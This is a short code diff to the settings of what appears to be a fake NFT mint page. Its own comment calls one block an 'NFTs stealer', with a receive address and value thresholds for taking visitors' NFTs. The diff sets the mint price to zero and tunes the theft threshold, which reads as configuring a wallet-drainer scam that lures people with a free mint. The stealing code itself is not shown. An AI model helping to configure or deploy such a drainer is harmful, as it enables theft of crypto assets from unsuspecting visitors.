@@ -23,7 +23,7 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 0.0,         // Price per NFT.
+    price: 0.00,         // Price per NFT.
     totalSupply: 999,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
     maxUnits: 6,        // Max units to buy.
@@ -32,7 +32,7 @@ const mintInfo = {
 
 const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.0,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
     receiveAddress: "" // leave empty if you want to use the same address 
 }
